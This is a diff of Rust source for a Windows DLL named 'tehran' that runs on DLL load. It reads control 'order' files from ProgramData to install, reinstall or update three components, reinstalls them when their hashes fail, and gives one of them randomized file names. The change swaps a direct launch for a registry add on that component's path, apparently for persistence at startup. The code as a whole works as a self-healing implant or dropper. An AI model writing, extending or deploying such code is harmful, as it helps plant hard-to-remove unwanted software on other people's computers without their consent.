@@ -9,9 +9,10 @@ mod configuration;
 use rand::thread_rng;
 
 use std::{
-    io,
+    io::{self, BufWriter, Write},
     path::PathBuf,
-    fs::{create_dir_all, remove_file},
+    fs::{create_dir_all, remove_file, OpenOptions, File},
+    sync::Mutex,
 };
 
 use windows::{
@@ -19,13 +20,15 @@ use windows::{
     Win32::System::SystemServices::*,
 };
 
+use lazy_static::{initialize as ls_initialize};
+
 use crate::{
-    constants::TEHRAN_NAME,
+    constants::{TEHRAN_NAME, LOG_PATH, LOG_FILEPATH},
     configuration::Configuration,
     ardakan_config::ArdakanConfig,
     setvol_config::SetvolConfig,
     soundlib_config::SoundlibConfig,
-    utils::{verify_file, cmd_without_output, cmd_with_output},
+    utils::{verify_file, thread_sleep, cmd_with_output, reg_add},
 };
 
 #[no_mangle]
@@ -38,10 +41,10 @@ extern "system" fn DllMain(
 {
     match call_reason {
         DLL_PROCESS_ATTACH => {
-            tehran_run();
+            tehran_startup();
         },
         DLL_PROCESS_DETACH => (),
-        _ => ()
+        _=> (),    
     }
     true
 }
@@ -55,39 +58,51 @@ pub extern "C" fn run() {
     ();
 }
 
-fn tehran_run() -> io::Result<()> {
-    println!("[INFO] obtaining the homedrive and username of the device...");
-    let HOMEDRIVE: String = match cmd_with_output("echo %HOMEDRIVE%") {
-        Ok(string) => string,
-        Err(error) => {
-            if PathBuf::from("C:").exists() {
-                String::from("C:")
-            } else {
-                return Err(error);
-            }
+use lazy_static::lazy_static;
+
+lazy_static! {
+    static ref LOG_FILE: Mutex<BufWriter<File>> = {
+        let file = OpenOptions::new().create(true).write(true).truncate(true).open(&LOG_FILEPATH).unwrap();
+        Mutex::new(BufWriter::new(file))
+    };
+}
+
+fn log(msg: &str) {
+    match LOG_FILE.lock() {
+        Ok(mut file) => {
+            writeln!(file, "{}", msg);
+            file.flush();
         }
+        Err(error) => eprintln!("[WARNING] mutex error\n///////// {}", error),
+    }   
+}
+
+fn tehran_startup() -> io::Result<()> {
+    thread_sleep(20.0);
+    create_dir_all(&LOG_PATH)?;
+    ls_initialize(&LOG_FILE);
+    log("[INFO] obtaining the homedrive of the device...");
+    let HOMEDRIVE: String = match PathBuf::from("C:").exists() {
+        true => String::from("C:"),
+        false => cmd_with_output("echo %HOMEDRIVE%")?,
     };
-    let USERNAME: String = match cmd_with_output("echo %USERNAME%") {
-        Ok(string) => string,
-        Err(error) => return Err(error),
-    };
-    println!("[INFO] done\n");
-    println!("[INFO] loading configuration...");
-    let mut configuration: Configuration = match Configuration::load(&HOMEDRIVE, &USERNAME) {
+    log("[INFO] done\n");
+    log("[INFO] loading configuration...");
+    let mut configuration: Configuration = match Configuration::load(&HOMEDRIVE, true) {
         Ok(config) => config,
         Err(error) => {
-            eprintln!("[WARNING] failed to load configuration\n///////// {}", error);
-            let configuration = Configuration::default(&HOMEDRIVE, &USERNAME)?;
+            log(&format!("[WARNING] failed to load configuration\n///////// {}", error));
+            let configuration = Configuration::default(&HOMEDRIVE)?;
             configuration.save()?;
             configuration
         },
     };
-    println!("[INFO] done\n");
+    log("[INFO] done\n");
     // TEHRAN-UNINSTALL-ALL
     {
         let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-UNINSTALL-ALL.order"].iter().collect();
         if filepath.is_file() {
-            println!("[INFO] TEHRAN-UNINSTALL-ALL order detected, uninstalling...");
+            log("[INFO] TEHRAN-UNINSTALL-ALL order detected, uninstalling...");
             configuration.ardakan.uninstall();
             configuration.ardakan.archive_uninstall();
             configuration.setvol.uninstall();
@@ -100,29 +115,29 @@ fn tehran_run() -> io::Result<()> {
             let config_filepath_main: String = format!("{}.config", TEHRAN_NAME);
             match remove_file(&config_filepath_1) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_1, error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_1, error)),
             }
             match remove_file(&config_filepath_2) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_2, error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_2, error)),
             }
             match remove_file(&config_filepath_3) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_3, error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_3, error)),
             }
             match remove_file(&config_filepath_main) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_main, error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_main, error)),
             }
             match remove_file(&filepath) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
             }
-            println!("[INFO] done\n");
+            log("[INFO] done\n");
             return Ok(());
         }
     }
-    println!("[INFO] verifying backup archives...");
+    log("[INFO] verifying backup archives...");
     let ardakan_archive_filepath: PathBuf = configuration.ardakan.get_archive_filepath();
     let setvol_archive_filepath: PathBuf = configuration.setvol.get_archive_filepath();
     let soundlib_archive_filepath: PathBuf = configuration.soundlib.get_archive_filepath();
@@ -139,56 +154,56 @@ fn tehran_run() -> io::Result<()> {
     if !soundlib_archive_filepath.exists() || !verify_file(&soundlib_archive_filepath, &configuration.soundlib.archive_hash).unwrap_or(true) {
         configuration.soundlib.archive_install();
     }
-    println!("[INFO] done\n");
+    log("[INFO] done\n");
     // TEHRAN-REINSTALL-ARDAKAN
     {
         let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-ARDAKAN.order" ].iter().collect();
         if filepath.is_file() {
-            println!("[INFO] TEHRAN-REINSTALL-ARDAKAN order detected, reinstalling ardakan...");
+            log("[INFO] TEHRAN-REINSTALL-ARDAKAN order detected, reinstalling ardakan...");
             configuration.ardakan.uninstall();
-            configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE, &USERNAME);
+            configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE);
             configuration.ardakan.install()?;
             configuration.save()?;
             match remove_file(&filepath) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
             }
-            println!("[INFO] done\n");
+            log("[INFO] done\n");
         }
     }
     // TEHRAN-REINSTALL-SETVOL
     {
         let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-SETVOL.order" ].iter().collect();
         if filepath.is_file() {
-            println!("[INFO] TEHRAN-REINSTALL-SETVOL order detected, reinstalling setvol...");
+            log("[INFO] TEHRAN-REINSTALL-SETVOL order detected, reinstalling setvol...");
             configuration.setvol.uninstall();
             configuration.setvol.install();
             match remove_file(&filepath) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
             }
-            println!("[INFO] done\n");
+            log("[INFO] done\n");
         }
     }
     // TEHRAN-REINSTALL-SOUNDLIB
     {
         let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-SOUNDLIB.order" ].iter().collect();
         if filepath.is_file() {
-            println!("[INFO] TEHRAN-REINSTALL-SOUNDLIB order detected, reinstalling soundlib...");
+            log("[INFO] TEHRAN-REINSTALL-SOUNDLIB order detected, reinstalling soundlib...");
             configuration.soundlib.uninstall();
             configuration.soundlib.install();
             match remove_file(&filepath) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
             }
-            println!("[INFO] done\n")
+            log("[INFO] done\n");
         }
     }
     // TEHRAN-UPDATE-ALL
     {
         let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-UPDATE-ALL.order" ].iter().collect();
         if filepath.is_file() {
-            println!("[INFO] TEHRAN-UPDATE-ALL order detected, updating...");
+            log("[INFO] TEHRAN-UPDATE-ALL order detected, updating...");
             configuration.ardakan.uninstall();
             configuration.ardakan.archive_uninstall();
             configuration.setvol.uninstall();
@@ -197,12 +212,12 @@ fn tehran_run() -> io::Result<()> {
             configuration.soundlib.archive_uninstall();
             match remove_file(&format!("{}.config", TEHRAN_NAME)) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove main config file\n+-- ///////// {}", error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove main config file\n+-- ///////// {}", error)),
             }
             ArdakanConfig::default_install()?;
             SetvolConfig::default_install()?;
             SoundlibConfig::default_install()?;
-            configuration = Configuration::default(&HOMEDRIVE, &USERNAME)?;
+            configuration = Configuration::default(&HOMEDRIVE)?;
             configuration.save()?;
             configuration.ardakan.archive_install()?;
             configuration.setvol.archive_install();
@@ -212,28 +227,28 @@ fn tehran_run() -> io::Result<()> {
             configuration.soundlib.install();
             match remove_file(&filepath) {
                 Ok(..) => (),
-                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
+                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
             }
-            println!("[INFO] done\n");
+            log("[INFO] done\n");
         }
     }
-    println!("[INFO] verifying ardakan installation...");
+    log("[INFO] verifying ardakan installation...");
     let ardakan_filepath: PathBuf = configuration.ardakan.get_filepath();
     if !(ardakan_filepath.is_file() && verify_file(&ardakan_filepath, &configuration.ardakan.hash).unwrap_or(false)) {
         configuration.ardakan.uninstall();
-        configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE, &USERNAME);
+        configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE);
         configuration.ardakan.install()?;
         configuration.save()?;
     }
-    println!("[INFO] done\n");
-    println!("[INFO] verifying setvol installation...");
+    log("[INFO] done\n");
+    log("[INFO] verifying setvol installation...");
     let setvol_filepath: PathBuf = configuration.setvol.get_filepath();
     if !(setvol_filepath.is_file() && verify_file(&setvol_filepath, &configuration.setvol.hash).unwrap_or(false)) {
         configuration.setvol.uninstall();
         configuration.setvol.install();
     }
-    println!("[INFO] done\n");
-    println!("[INFO] verifying soundlib installation...");
+    log("[INFO] done\n");
+    log("[INFO] verifying soundlib installation...");
     for filepath in configuration.soundlib.get_filepaths().iter() {
         if !filepath.exists() {
             configuration.soundlib.uninstall();
@@ -241,9 +256,11 @@ fn tehran_run() -> io::Result<()> {
             break;
         }
     }
-    println!("[INFO] done\n");
-    println!("[INFO] launching ardakan...");
-    let command: String = format!("cd /D {} && {} .", configuration.ardakan.path.display(), configuration.ardakan.filename.display());
-    cmd_without_output(&command)?;
+    log("[INFO] done\n");
+    log("[INFO] executing reg add command");
+    match reg_add(configuration.ardakan.get_filepath().to_str().unwrap()) {
+        Ok(string) => log(&string),
+        Err(error) => log(&format!("[ERROR] failed to execute reg add command\n/////// {}", error))
+    }
     return Ok(());
 }
